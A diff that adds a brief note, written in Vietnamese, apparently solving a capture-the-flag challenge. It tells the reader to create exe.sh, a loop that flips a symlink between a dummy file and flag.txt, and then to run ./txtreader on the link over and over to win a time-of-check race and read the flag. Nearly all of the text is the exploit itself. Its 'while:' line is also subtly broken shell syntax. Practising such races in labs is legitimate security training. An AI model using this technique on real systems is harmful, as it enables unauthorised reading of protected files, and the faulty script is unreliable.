@@ -1,0 +1,14 @@
+tạo file exe.sh
+#!/bin/bash
+
+touch ./dummy
+while:
+do
+ln -sf ./dummy ./link
+ln -sf ./flag.txt ./link
+done
+
+
+sau đó chạy file
+
+while true;do ./txtreader ./link ;done|& grep -v Error
